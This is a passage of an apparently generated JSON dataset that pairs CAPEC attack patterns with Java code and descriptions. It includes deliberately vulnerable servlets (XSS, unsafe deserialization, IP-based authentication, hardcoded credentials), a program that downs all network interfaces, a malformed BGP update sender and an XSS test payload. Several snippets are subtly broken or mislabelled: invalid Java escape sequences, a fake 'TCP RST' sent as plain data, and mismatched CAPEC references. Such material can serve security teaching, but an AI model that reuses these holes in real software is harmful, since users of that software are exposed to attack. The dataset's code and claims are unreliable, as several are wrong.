        "description": "This Java code snippet demonstrates the concept of 'Route Disabling' by attempting to establish a network connection to a target IP and port, and then immediately closing the connection to simulate the disabling of the route. This represents the CAPEC idea of severing the communication channel between two entities. The code also touches on related CWEs by showing potential vulnerabilities such as improper enforcement of message integrity (CWE-924), improper restriction of communication channels (CWE-923), and incorrectly specified destinations (CWE-941). The race condition (CWE-421) and unauthorized error injection (CWE-1334) are not directly represented but are relevant in the broader context of network communication vulnerabilities."
    },
    {
        "capec_id": "583",
        "capec_name": "Disabling Network Hardware",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.NetworkInterface;\nimport java.net.SocketException;\nimport java.util.Enumeration;\n\npublic class NetworkDisabler {\n    public static void main(String[] args) {\n        try {\n            Enumeration<NetworkInterface> interfaces = NetworkInterface.getNetworkInterfaces();\n            while (interfaces.hasMoreElements()) {\n                NetworkInterface networkInterface = interfaces.nextElement();\n                if (networkInterface.isUp()) {\n                    disableNetworkInterface(networkInterface);\n                }\n            }\n        } catch (SocketException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void disableNetworkInterface(NetworkInterface networkInterface) {\n        try {\n            // Simulate disabling the network interface by setting it down\n            Process process = Runtime.getRuntime().exec(\"ifconfig \" + networkInterface.getName() + \" down\");\n            process.waitFor();\n            System.out.println(\"Disabled network interface: \" + networkInterface.getName());\n        } catch (IOException | InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of 'Disabling Network Hardware' by iterating through all network interfaces on the system and disabling them if they are active. The `disableNetworkInterface` method uses a system command to bring down the network interface, simulating a physical disconnection or power down. This represents the CAPEC idea of physically disabling networking hardware to prevent it from performing its intended service. The code also touches on related CWEs by not ensuring the integrity of the hardware configuration state (CWE-1304) and not properly restricting software interfaces to hardware features (CWE-1256)."
    },
    {
        "capec_id": "584",
        "capec_name": "BGP Route Disabling",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class BGPRouteDisabler {\n    public static void main(String[] args) {\n        try {\n            // Incorrectly specified destination (CWE-941)\n            String targetAS = \"192.0.2.1\"; // Example IP address of target Autonomous System\n            Socket socket = new Socket(targetAS, 179); // BGP typically uses port 179\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n\n            // Send a malformed BGP update to suppress route (CWE-924)\n            String bgpUpdate = \"\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\x00\\x13\\x02\\x00\\x00\\x00\";\n            out.println(bgpUpdate);\n\n            // Read response (if any) - not ensuring message integrity (CWE-924)\n            String response = in.readLine();\n            System.out.println(\"Response: \" + response);\n\n            // Close connections\n            out.close();\n            in.close();\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified and vulnerable example of how an adversary might attempt to disable a BGP route by sending a malformed BGP update message to a target Autonomous System (AS). The code includes several weaknesses related to the CAPEC description:\n\n1. **Incorrectly Specified Destination (CWE-941)**: The code specifies a target AS using an IP address, which may not be the correct destination for the intended communication.\n2. **Improper Enforcement of Message Integrity (CWE-924)**: The code sends a malformed BGP update message without ensuring its integrity, potentially allowing an adversary to modify the message during transmission.\n3. **Selection of Less-Secure Algorithm During Negotiation (CWE-757)**: Although not explicitly shown in the code, the concept of algorithm downgrade can be implied if the BGP session negotiation does not enforce the strongest available security algorithms.\n\nThe main idea represented by this code is the suppression of BGP route advertisements to render a network inaccessible, aligning with the CAPEC description of BGP Route Disabling."
    },
    {
        "capec_id": "585",
        "capec_name": "DNS Domain Seizure",
        "code_snippet": "import java.net.InetAddress;\nimport java.net.UnknownHostException;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class DNSDomainSeizureExample {\n    private static Map<String, String> domainToIP = new HashMap<>();\n\n    static {\n        // Simulating a domain to IP mapping\n        domainToIP.put(\"example.com\", \"192.168.1.1\");\n    }\n\n    public static void main(String[] args) {\n        String domain = \"example.com\";\n        try {\n            // Reverse DNS resolution\n            InetAddress inetAddress = InetAddress.getByName(domain);\n            String ipAddress = inetAddress.getHostAddress();\n\n            // Security decision based on reverse DNS resolution\n            if (domainToIP.containsKey(domain) && domainToIP.get(domain).equals(ipAddress)) {\n                System.out.println(\"Access granted to \" + domain);\n            } else {\n                System.out.println(\"Access denied to \" + domain);\n            }\n        } catch (UnknownHostException e) {\n            System.out.println(\"Domain not found: \" + domain);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified scenario of DNS Domain Seizure. The code performs reverse DNS resolution to obtain the IP address of a given domain and makes a security decision based on this information. The domain-to-IP mapping is hardcoded for simplicity. If the resolved IP address matches the expected IP address, access is granted; otherwise, access is denied. This example highlights CWE-350 (Reliance on Reverse DNS Resolution for a Security-Critical Action), where the security decision is based on potentially unreliable DNS information. An attacker could manipulate DNS records to disrupt service access, embodying the main idea of DNS Domain Seizure."
    },
    {
        "capec_id": "586",
        "capec_name": "Object Injection",
        "code_snippet": "import java.io.*;\n\nclass SensitiveData implements Serializable {\n    private static final long serialVersionUID = 1L;\n    private String secret;\n\n    public SensitiveData(String secret) {\n        this.secret = secret;\n    }\n\n    public String getSecret() {\n        return secret;\n    }\n}\n\npublic class ObjectInjectionExample {\n    public static void main(String[] args) {\n        try {\n            // Simulate receiving serialized data from an untrusted source\n            byte[] maliciousData = getMaliciousSerializedData();\n            ByteArrayInputStream bis = new ByteArrayInputStream(maliciousData);\n            ObjectInputStream ois = new ObjectInputStream(bis);\n\n            // Deserialization of untrusted data\n            SensitiveData data = (SensitiveData) ois.readObject();\n            System.out.println(\"Deserialized secret: \" + data.getSecret());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static byte[] getMaliciousSerializedData() {\n        // This method simulates an attacker providing a malicious serialized object\n        // In a real scenario, this data could be crafted to exploit vulnerabilities\n        try {\n            ByteArrayOutputStream bos = new ByteArrayOutputStream();\n            ObjectOutputStream oos = new ObjectOutputStream(bos);\n            oos.writeObject(new SensitiveData(\"malicious data\"));\n            return bos.toByteArray();\n        } catch (IOException e) {\n            e.printStackTrace();\n            return new byte[0];\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to object injection and deserialization of untrusted data. The `SensitiveData` class contains sensitive information and implements `Serializable`, making it possible to serialize and deserialize its instances. The `ObjectInjectionExample` class simulates receiving serialized data from an untrusted source, which is then deserialized without proper validation. This can lead to potential exploitation, such as remote code execution or exposure of sensitive data. The `getMaliciousSerializedData` method simulates an attacker providing a malicious serialized object. This example highlights the risks associated with deserializing untrusted data, as described in CAPEC-502 and related CWEs."
    },
    {
        "capec_id": "587",
        "capec_name": "Cross Frame Scripting (XFS)",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userContent = request.getParameter(\"content\");\n        response.setContentType(\"text/html\");\n        response.getWriter().println(\"<html><body>\");\n        response.getWriter().println(\"<iframe src='https://legitimate-site.com' style='display:none;' id='hiddenFrame'></iframe>\");\n        response.getWriter().println(\"<script>\");\n        response.getWriter().println(\"document.getElementById('hiddenFrame').onload = function() {\");\n        response.getWriter().println(\"  var iframeDoc = document.getElementById('hiddenFrame').contentDocument;\");\n        response.getWriter().println(\"  iframeDoc.body.innerHTML += '\" + userContent + \"';\");\n        response.getWriter().println(\"};\");\n        response.getWriter().println(\"</script>\");\n        response.getWriter().println(\"</body></html>\");\n    }\n}",
        "description": "This Java servlet code demonstrates a Cross Frame Scripting (XFS) vulnerability. The servlet takes user input from a request parameter 'content' and injects it into a hidden iframe that loads a legitimate site. The malicious JavaScript in the servlet interacts with the iframe's content, potentially executing harmful scripts or manipulating the legitimate site's content without the user's knowledge. This example also highlights related weaknesses such as improper neutralization of input (CWE-79), improper restriction of frames (CWE-1021), and potential for Cross-Site Request Forgery (CWE-352)."
    },
    {
        "capec_id": "588",
        "capec_name": "DOM-Based XSS",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"input\");\n        response.setContentType(\"text/html\");\n        response.getWriter().write(\"<html><body>\");\n        response.getWriter().write(\"<div id='userInput'>\" + userInput + \"</div>\");\n        response.getWriter().write(\"<script>\");\n        response.getWriter().write(\"document.getElementById('userInput').innerHTML = '\" + userInput + \"';\");\n        response.getWriter().write(\"</script>\");\n        response.getWriter().write(\"</body></html>\");\n    }\n}",
        "description": "This Java servlet code demonstrates a DOM-Based XSS vulnerability. The servlet reads a parameter 'input' from the HTTP request and directly writes it into the HTML response without proper validation or encoding. The user input is inserted into a <div> element and also used within a <script> tag to manipulate the DOM. This allows an attacker to inject malicious scripts that will execute in the context of the user's browser, bypassing server-side filters. The code embodies the main idea of CAPEC-63 (DOM-Based XSS) and is related to several CWEs, including CWE-79 (Improper Neutralization of Input During Web Page Generation), CWE-20 (Improper Input Validation), and CWE-83 (Improper Neutralization of Script in Attributes in a Web Page)."
    },
    {
        "capec_id": "589",
        "capec_name": "DNS Blocking",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class DNSBlockingExample {\n    public static void main(String[] args) {\n        try {\n            // Vulnerable to DNS Blocking\n            String hostname = \"example.com\";\n            InetAddress address = InetAddress.getByName(hostname);\n            System.out.println(\"IP Address: \" + address.getHostAddress());\n\n            // Vulnerable to CWE-291: Reliance on IP Address for Authentication\n            if (address.getHostAddress().equals(\"192.168.1.1\")) {\n                System.out.println(\"Authenticated based on IP address.\");\n            }\n\n            // Vulnerable to CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action\n            String reverseHostname = address.getCanonicalHostName();\n            if (reverseHostname.equals(\"trusted.example.com\")) {\n                System.out.println(\"Security-critical action allowed based on reverse DNS.\");\n            }\n\n            // Vulnerable to CWE-1327: Binding to an Unrestricted IP Address\n            ServerSocket serverSocket = new ServerSocket(8080, 50, InetAddress.getByName(\"0.0.0.0\"));\n            System.out.println(\"Server started on 0.0.0.0:8080\");\n\n        } catch (UnknownHostException e) {\n            System.err.println(\"DNS resolution failed.\");\n        } catch (IOException e) {\n            System.err.println(\"Server socket creation failed.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates several vulnerabilities related to DNS Blocking and associated CWEs. The code attempts to resolve a hostname to an IP address, which can be intercepted and blocked by an adversary (CAPEC-300). It then uses the resolved IP address for authentication (CWE-291), which is insecure. The code also performs a reverse DNS lookup to make a security-critical decision (CWE-350), which can be spoofed. Finally, it binds a server socket to the unrestricted IP address 0.0.0.0 (CWE-1327), making it accessible from any network interface. These vulnerabilities highlight the risks of relying on DNS and IP addresses for security decisions and the potential for DNS blocking attacks."
    },
    {
        "capec_id": "590",
        "capec_name": "IP Address Blocking",
        "code_snippet": "import java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class VulnerableServer {\n    public static void main(String[] args) {\n        try (ServerSocket serverSocket = new ServerSocket(8080)) { // CWE-1327: Binding to an Unrestricted IP Address\n            System.out.println(\"Server is listening on port 8080\");\n\n            while (true) {\n                Socket socket = serverSocket.accept();\n                String clientIP = socket.getInetAddress().getHostAddress();\n                System.out.println(\"Accepted connection from \" + clientIP);\n\n                // CWE-291: Reliance on IP Address for Authentication\n                if (clientIP.equals(\"192.168.1.100\")) {\n                    System.out.println(\"Authenticated client: \" + clientIP);\n                    // Handle client request\n                } else {\n                    System.out.println(\"Rejected client: \" + clientIP);\n                    socket.close();\n                }\n            }\n        } catch (IOException ex) {\n            System.out.println(\"Server exception: \" + ex.getMessage());\n            ex.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable server that listens on port 8080 and uses the client's IP address for authentication. The server binds to an unrestricted IP address (0.0.0.0), which is a common issue (CWE-1327). When a client connects, the server checks the client's IP address and only allows connections from a specific IP (192.168.1.100), relying on the IP address for authentication (CWE-291). This approach is vulnerable to IP address spoofing and does not ensure the integrity of the communication channel, making it susceptible to IP address blocking attacks as described in the CAPEC."
    },
    {
        "capec_id": "591",
        "capec_name": "Reflected XSS",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"input\");\n        response.setContentType(\"text/html\");\n        response.getWriter().println(\"<html><body>\");\n        response.getWriter().println(\"<h1>Welcome, \" + userInput + \"</h1>\");\n        response.getWriter().println(\"</body></html>\");\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a Reflected XSS vulnerability. The servlet takes a user-provided input from the HTTP request parameter 'input' and directly includes it in the HTML response without proper neutralization. This can lead to an XSS attack if an attacker provides a malicious script as the input. For example, if the input is '<script>alert(1)</script>', the script will be executed in the victim's browser. This snippet embodies CWE-79 (Improper Neutralization of Input During Web Page Generation) and CWE-81 (Improper Neutralization of Script in an Error Message Web Page) by failing to sanitize user input before including it in the web page output."
    },
    {
        "capec_id": "592",
        "capec_name": "Stored XSS",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.PrintWriter;\n\n@WebServlet(\"/storeComment\")\npublic class StoreCommentServlet extends HttpServlet {\n    private static final long serialVersionUID = 1L;\n\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String comment = request.getParameter(\"comment\");\n        // Simulate storing the comment in a database (in reality, you would use a database connection here)\n        // For demonstration, we will just store it in a static variable\n        Database.storeComment(comment);\n\n        response.setContentType(\"text/html\");\n        PrintWriter out = response.getWriter();\n        out.println(\"<html><body>\");\n        out.println(\"<h2>Comment stored successfully!</h2>\");\n        out.println(\"<a href='viewComments'>View Comments</a>\");\n        out.println(\"</body></html>\");\n    }\n}\n\nclass Database {\n    private static String storedComment;\n\n    public static void storeComment(String comment) {\n        storedComment = comment;\n    }\n\n    public static String getStoredComment() {\n        return storedComment;\n    }\n}\n\n@WebServlet(\"/viewComments\")\npublic class ViewCommentsServlet extends HttpServlet {\n    private static final long serialVersionUID = 1L;\n\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        response.setContentType(\"text/html\");\n        PrintWriter out = response.getWriter();\n        out.println(\"<html><body>\");\n        out.println(\"<h2>Stored Comments:</h2>\");\n        // Directly outputting the stored comment without any sanitization\n        out.println(\"<p>\" + Database.getStoredComment() + \"</p>\");\n        out.println(\"</body></html>\");\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable web application that is susceptible to Stored Cross-Site Scripting (XSS) attacks. The `StoreCommentServlet` class accepts user input via a POST request and stores it in a simulated database. The `ViewCommentsServlet` class retrieves and displays the stored comment without any sanitization. This lack of input neutralization (CWE-79) allows an attacker to store malicious scripts that will be executed when other users view the comments. The code also highlights the risk of using incomplete denylist-based protection (CWE-692) and improper validation of input (CWE-1289)."
    },
    {
        "capec_id": "593",
        "capec_name": "Session Hijacking",
        "code_snippet": "import javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport javax.servlet.http.HttpSession;\nimport java.io.IOException;\n\npublic class VulnerableSessionServlet extends HttpServlet {\n    @Override\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String username = request.getParameter(\"username\");\n        String password = request.getParameter(\"password\");\n\n        // Simulate authentication (Improper Authentication - CWE-287)\n        if (\"admin\".equals(username) && \"password123\".equals(password)) {\n            HttpSession session = request.getSession();\n            session.setAttribute(\"user\", username);\n            response.getWriter().println(\"Authenticated as \" + username);\n        } else {\n            response.getWriter().println(\"Authentication failed\");\n        }\n    }\n\n    @Override\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        HttpSession session = request.getSession(false);\n        if (session != null && session.getAttribute(\"user\") != null) {\n            response.getWriter().println(\"Welcome back, \" + session.getAttribute(\"user\"));\n        } else {\n            response.getWriter().println(\"Please log in\");\n        }\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerable implementation of session management, embodying the concept of Session Hijacking (CAPEC-139). The code contains several weaknesses: \n1. Improper Authentication (CWE-287): The authentication mechanism is overly simplistic and insecure, using hardcoded credentials.\n2. Session Fixation (CWE-384): The code does not invalidate any existing session identifier upon authentication, allowing an attacker to hijack the session.\n3. Insufficient Session Expiration (CWE-613): The session is not configured to expire, allowing reuse of old session credentials.\n4. Insufficient Session-ID Length (CWE-6): Although not explicitly shown, the default session ID length may be insufficient if not properly configured.\n5. Client-Side Enforcement of Server-Side Security (CWE-602): The server relies on the client to maintain the session, which can be manipulated by an attacker.\n\nThe code snippet highlights the main idea of session hijacking by showing how an attacker could exploit these weaknesses to gain unauthorized access to the application."
    },
    {
        "capec_id": "594",
        "capec_name": "Traffic Injection",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableServer {\n    public static void main(String[] args) {\n        try (ServerSocket serverSocket = new ServerSocket(8080)) {\n            while (true) {\n                Socket clientSocket = serverSocket.accept();\n                handleClient(clientSocket);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void handleClient(Socket clientSocket) {\n        try (BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n             PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true)) {\n\n            String inputLine;\n            while ((inputLine = in.readLine()) != null) {\n                // Echo the received message back to the client\n                out.println(inputLine);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet represents a simple server that listens for incoming connections on port 8080 and echoes back any received messages. The code embodies the main idea of the CAPEC 'Traffic Injection' by demonstrating a scenario where an adversary could inject traffic into the network connection. The server does not verify the source of the communication channel (CWE-940), does not enforce message integrity (CWE-924), and transmits data in cleartext (CWE-319). This makes it vulnerable to traffic injection attacks, where an adversary could degrade, disrupt, or modify the connection."
    },
    {
        "capec_id": "595",
        "capec_name": "Connection Reset",
        "code_snippet": "import java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.net.SocketException;\n\npublic class VulnerableServer {\n    public static void main(String[] args) {\n        try (ServerSocket serverSocket = new ServerSocket(8080)) {\n            while (true) {\n                Socket clientSocket = serverSocket.accept();\n                new Thread(new ClientHandler(clientSocket)).start();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n\nclass ClientHandler implements Runnable {\n    private Socket clientSocket;\n\n    public ClientHandler(Socket clientSocket) {\n        this.clientSocket = clientSocket;\n    }\n\n    @Override\n    public void run() {\n        try {\n            // Simulate handling client connection\n            Thread.sleep(1000);\n            // Simulate connection reset vulnerability\n            clientSocket.setSoLinger(true, 0); // Improperly reset connection\n            clientSocket.close();\n        } catch (SocketException e) {\n            e.printStackTrace();\n        } catch (IOException | InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet represents a vulnerable server that listens for incoming connections on port 8080. When a client connects, a new thread is spawned to handle the connection. The ClientHandler class simulates handling the client connection and then improperly resets the connection using the setSoLinger method with a timeout of 0, which immediately sends a TCP RST (reset) packet to the client. This embodies the main idea of the CAPEC 'Connection Reset' attack pattern, where an adversary can inject a connection reset packet to sever the connection. The code also touches on related CWEs such as CWE-940 (Improper Verification of Source of a Communication Channel) and CWE-924 (Improper Enforcement of Message Integrity During Transmission in a Communication Channel) by not verifying the source of the connection and not ensuring message integrity."
    },
    {
        "capec_id": "596",
        "capec_name": "TCP RST Injection",
        "code_snippet": "import java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.io.OutputStream;\nimport java.io.InputStream;\n\npublic class TCPRSTInjectionExample {\n    public static void main(String[] args) throws IOException {\n        ServerSocket serverSocket = new ServerSocket(8080);\n        System.out.println(\"Server is listening on port 8080\");\n\n        while (true) {\n            Socket clientSocket = serverSocket.accept();\n            System.out.println(\"Client connected\");\n\n            // Simulate handling a HTTP GET request\n            InputStream input = clientSocket.getInputStream();\n            byte[] buffer = new byte[1024];\n            int bytesRead = input.read(buffer);\n            String request = new String(buffer, 0, bytesRead);\n            System.out.println(\"Received request: \" + request);\n\n            // Simulate sending a TCP RST packet\n            OutputStream output = clientSocket.getOutputStream();\n            byte[] rstPacket = createRSTPacket();\n            output.write(rstPacket);\n            output.flush();\n            System.out.println(\"Sent TCP RST packet\");\n\n            clientSocket.close();\n        }\n    }\n\n    private static byte[] createRSTPacket() {\n        // This is a simplified representation of a TCP RST packet\n        // In a real scenario, this would be a properly crafted TCP RST packet\n        return new byte[]{0x00, 0x00, 0x00, 0x00};\n    }\n}\n",
        "description": "This Java code snippet demonstrates a simplified example of a TCP RST Injection attack. The server listens on port 8080 and accepts incoming client connections. Upon receiving a HTTP GET request, the server simulates sending a TCP RST packet to the client, causing the termination of the TCP connection. This example embodies the main idea of CAPEC-297 (TCP RST Injection) by showing how an adversary might inject a TCP RST packet to disrupt a connection. The code also touches on CWE-940 (Improper Verification of Source of a Communication Channel) as it does not verify the source of the incoming request, making it vulnerable to such attacks."
    },
    {
        "capec_id": "597",
        "capec_name": "Absolute Path Traversal",
        "code_snippet": "import java.io.*;\n\npublic class PathTraversalExample {\n    public static void main(String[] args) {\n        if (args.length != 1) {\n            System.out.println(\"Usage: java PathTraversalExample <filename>\");\n            return;\n        }\n\n        String filename = args[0];\n        File file = new File(\"/restricted/directory/\" + filename);\n\n        try (BufferedReader reader = new BufferedReader(new FileReader(file))) {\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability to Absolute Path Traversal. The program takes a filename as a command-line argument and attempts to read the file from a restricted directory. However, it does not properly validate or sanitize the input, allowing an attacker to use sequences like '../' to traverse directories and access files outside the restricted directory. This embodies the main idea of the CAPEC and related CWEs, where improper handling of user input in file paths can lead to unauthorized access to the filesystem."
    },
    {
        "capec_id": "598",
        "capec_name": "DNS Spoofing",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class DnsSpoofingExample {\n    public static void main(String[] args) {\n        try {\n            // CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action\n            InetAddress addr = InetAddress.getByName(\"example.com\");\n            String hostname = addr.getHostName();\n            System.out.println(\"Resolved hostname: \" + hostname);\n\n            // CWE-941: Incorrectly Specified Destination in a Communication Channel\n            URL url = new URL(\"http://\" + hostname + \"/data\");\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"GET\");\n\n            // CWE-494: Download of Code Without Integrity Check\n            InputStream is = conn.getInputStream();\n            BufferedReader br = new BufferedReader(new InputStreamReader(is));\n            String line;\n            while ((line = br.readLine()) != null) {\n                System.out.println(line);\n            }\n            br.close();\n\n            // CWE-601: URL Redirection to Untrusted Site\n            String redirectUrl = \"http://untrusted.com/redirect\";\n            System.out.println(\"Redirecting to: \" + redirectUrl);\n            URL redirect = new URL(redirectUrl);\n            HttpURLConnection redirectConn = (HttpURLConnection) redirect.openConnection();\n            redirectConn.setRequestMethod(\"GET\");\n            redirectConn.getInputStream();\n\n            // CWE-918: Server-Side Request Forgery (SSRF)\n            String ssrfUrl = \"http://internal-service.local/data\";\n            URL ssrf = new URL(ssrfUrl);\n            HttpURLConnection ssrfConn = (HttpURLConnection) ssrf.openConnection();\n            ssrfConn.setRequestMethod(\"GET\");\n            ssrfConn.getInputStream();\n\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where DNS spoofing can be exploited, incorporating several related CWEs. The code performs the following actions:\n\n1. **CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action** - The code resolves the hostname for 'example.com' and uses it for further actions without verifying the integrity of the DNS response.\n\n2. **CWE-941: Incorrectly Specified Destination in a Communication Channel** - The code constructs a URL using the resolved hostname, which could be incorrect due to DNS spoofing.\n\n3. **CWE-494: Download of Code Without Integrity Check** - The code downloads data from the constructed URL without verifying its integrity.\n\n4. **CWE-601: URL Redirection to Untrusted Site** - The code demonstrates a redirection to an untrusted URL, which could be used for phishing attacks.\n\n5. **CWE-918: Server-Side Request Forgery (SSRF)** - The code makes a request to an internal service URL, which could be exploited if the URL is manipulated.\n\nOverall, this code snippet highlights how DNS spoofing can lead to various security vulnerabilities by manipulating DNS responses and exploiting the lack of proper validation and integrity checks in the application."
    },
    {
        "capec_id": "599",
        "capec_name": "Terrestrial Jamming",
        "code_snippet": "import java.io.IOException;\nimport java.net.Socket;\nimport java.io.OutputStream;\nimport java.io.InputStream;\n\npublic class SatelliteCommunication {\n    private static final String SERVER_ADDRESS = \"192.168.1.100\";\n    private static final int SERVER_PORT = 8080;\n\n    public static void main(String[] args) {\n        try {\n            Socket socket = new Socket(SERVER_ADDRESS, SERVER_PORT);\n            OutputStream out = socket.getOutputStream();\n            InputStream in = socket.getInputStream();\n\n            // Sending sensitive data in cleartext\n            String sensitiveData = \"username=admin&password=12345\";\n            out.write(sensitiveData.getBytes());\n            out.flush();\n\n            // Receiving response without ensuring message integrity\n            byte[] response = new byte[1024];\n            int bytesRead = in.read(response);\n            String responseData = new String(response, 0, bytesRead);\n            System.out.println(\"Response: \" + responseData);\n\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable satellite communication scenario. The code establishes a socket connection to a server, sends sensitive data in cleartext, and receives a response without ensuring message integrity. This embodies the main idea of the CAPEC 'Terrestrial Jamming' by showing how an adversary could exploit the lack of proper security measures (related CWEs) to disrupt or intercept the communication. Specifically, CWE-319 (Cleartext Transmission of Sensitive Information) and CWE-924 (Improper Enforcement of Message Integrity During Transmission in a Communication Channel) are highlighted in this example."
    },
    {
        "capec_id": "600",
        "capec_name": "Credential Stuffing",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class CredentialStuffingExample {\n    private static Map<String, String> userDatabase = new HashMap<>();\n    private static Map<String, Integer> loginAttempts = new HashMap<>();\n\n    static {\n        // Insecurely stored credentials\n        userDatabase.put(\"user1\", \"password123\");\n        userDatabase.put(\"user2\", \"password123\");\n    }\n\n    public static void main(String[] args) {\n        String username = \"user1\";\n        String password = \"password123\";\n\n        if (authenticate(username, password)) {\n            System.out.println(\"Login successful!\");\n        } else {\n            System.out.println(\"Login failed!\");\n        }\n    }\n\n    public static boolean authenticate(String username, String password) {\n        // CWE-307: No restriction on excessive authentication attempts\n        loginAttempts.put(username, loginAttempts.getOrDefault(username, 0) + 1);\n\n        // CWE-308: Single-factor authentication\n        if (userDatabase.containsKey(username) && userDatabase.get(username).equals(password)) {\n            return true;\n        }\n        return false;\n    }\n}",
        "description": "This Java code snippet demonstrates a simple authentication system that is vulnerable to credential stuffing attacks. The code stores user credentials insecurely (CWE-522) and uses single-factor authentication (CWE-308). Additionally, it does not implement any measures to restrict excessive authentication attempts (CWE-307), making it susceptible to brute force attacks. The main idea of the CAPEC is represented by the fact that an adversary can try known username/password combinations to gain access, exploiting the weaknesses in the authentication mechanism."
    },
    {
        "capec_id": "601",
        "capec_name": "Jamming",
        "code_snippet": "import java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class JammingExample {\n    public static void main(String[] args) throws IOException {\n        DatagramSocket socket = new DatagramSocket(9876);\n        byte[] buffer = new byte[1024];\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n\n        while (true) {\n            socket.receive(packet);\n            String received = new String(packet.getData(), 0, packet.getLength());\n            System.out.println(\"Received: \" + received);\n\n            // Simulate jamming by sending a large volume of packets\n            if (received.equals(\"JAM\")) {\n                for (int i = 0; i < 1000; i++) {\n                    byte[] jamData = \"JAMMING\".getBytes();\n                    DatagramPacket jamPacket = new DatagramPacket(jamData, jamData.length, InetAddress.getByName(\"localhost\"), 9876);\n                    socket.send(jamPacket);\n                }\n            }\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple example of a jamming attack using UDP packets. The program listens for incoming packets on port 9876. When it receives a packet with the content 'JAM', it simulates a jamming attack by sending a large volume of 'JAMMING' packets back to the same port. This overwhelms the network, disrupting legitimate communication. The code embodies the main idea of the CAPEC by intentionally overwhelming system resources with illegitimate traffic, thereby denying service to legitimate users. The related CWEs are represented as follows: CWE-406 (Insufficient Control of Network Message Volume) is demonstrated by the lack of control over the volume of packets sent, and CWE-923 (Improper Restriction of Communication Channel to Intended Endpoints) is shown by the indiscriminate sending of packets to the same port without verifying the endpoint."
    },
    {
        "capec_id": "602",
        "capec_name": "DEPRECATED: Degradation",
